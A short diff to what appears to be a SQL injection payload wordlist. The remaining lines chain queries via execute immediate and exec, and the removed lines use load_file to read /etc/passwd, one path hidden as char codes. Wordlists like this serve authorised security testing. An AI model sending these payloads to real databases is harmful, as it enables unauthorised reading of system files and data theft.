@@ -28,7 +28,3 @@ password:*/=1--
 '; execute immediate 'sel' || 'ect us' || 'er'
 '; exec ('sel' + 'ect us' + 'er')
 ' and 1 in (select var from temp)--
-' union select 1,load_file('/etc/passwd'),1,1,1;
-1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
-' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
-
